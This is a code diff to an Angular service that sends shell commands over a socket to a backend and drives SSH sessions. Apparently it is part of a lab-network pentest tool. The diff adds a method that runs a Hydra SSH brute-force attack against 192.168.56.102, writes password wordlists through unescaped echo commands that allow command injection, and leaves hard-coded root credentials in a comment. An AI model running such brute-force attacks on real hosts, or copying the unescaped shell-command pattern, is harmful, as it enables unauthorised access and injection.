@@ -7,33 +7,33 @@ import {Observable} from 'rxjs/Observable';
 @Injectable()
 export class ApiSshService {
 
-  protected url : string = '192.168.56.101';
-  protected port : string = '8888';
+  protected url: string = '192.168.56.101';
+  protected port: string = '8888';
 
   socket: SocketIOClient.Socket = null;
 
 
   public shellAnswer;
 
-  constructor(){
+  constructor() {
     this.connectSocket('http://' + this.url + ':' + this.port);
     this.shellAnswer = new Observable(observer => {
-      this.socket.on('data', function(data, res){
+      this.socket.on('data', function (data, res) {
         observer.next(data);
       });
     });
   }
 
-  connectSocket(uri:String){
-    if(this.socket !== null){
+  connectSocket(uri: String) {
+    if (this.socket !== null) {
       console.log(' - socket already existing - ');
       return;
     }
     this.socket = io.connect(uri);
   }
 
-  disconnectSocket(){
-    if(this.socket == null){
+  disconnectSocket() {
+    if (this.socket == null) {
       console.log(' - socket already disconnected - ');
       return;
     }
@@ -41,6 +41,7 @@ export class ApiSshService {
     this.socket.disconnect();
     this.socket = null;
   }
+
   /*test(){
     this.socket.emit('shellexec', { command: 'cd ~ && ls -a' });
     this.socket.emit('sshAccess', { ip: '192.168.56.102', user : 'root', password : 'network'});
@@ -53,40 +54,42 @@ export class ApiSshService {
     });
   }*/
 
-  connectSsh(ip, user, password){
-    this.socket.emit('connectSSH', {ip: ip, user : user, password : password});
+  connectSsh(ip, user, password) {
+    this.socket.emit('connectSSH', {ip: ip, user: user, password: password});
   }
 
-  disconnectSsh(){
+  disconnectSsh() {
     this.socket.emit('disconnectSSH');
   }
 
 
+  /* getData(){
+     this.socket.on('shellexecanswer', function (data) {
+       if(data === undefined){
+         console.log('undefined data :(');
+       }else {
+         console.log(data);
+       }
+     })
+   }*/
 
- /* getData(){
-    this.socket.on('shellexecanswer', function (data) {
-      if(data === undefined){
-        console.log('undefined data :(');
-      }else {
-        console.log(data);
-      }
-    })
-  }*/
-
-  sendCommand(command:string){
+  sendCommand(command: string) {
     this.socket.emit('command', command);
   }
 
   // SPECIFICS COMMANDS
 
-  writePasswordFile(tab){
-    for ( let i = 0; i < tab.length; i++){
+  writePasswordFile(tab) {
+    for (let i = 0; i < tab.length; i++) {
       if (i === 0) {
-        this.socket.emit('command', 'echo ' + tab[i] + ' > password.txt');
-      }else{
-        this.socket.emit('command', 'echo ' + tab[i] + ' >> password.txt');
+        this.socket.emit('command', 'echo ' + tab[i] + ' > password.txt\r');
+      } else {
+        this.socket.emit('command', 'echo ' + tab[i] + ' >> password.txt\r');
       }
     }
   }
 
+  runBruteForceAttack() {
+    this.socket.emit('command', 'hydra -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
+  }
 }
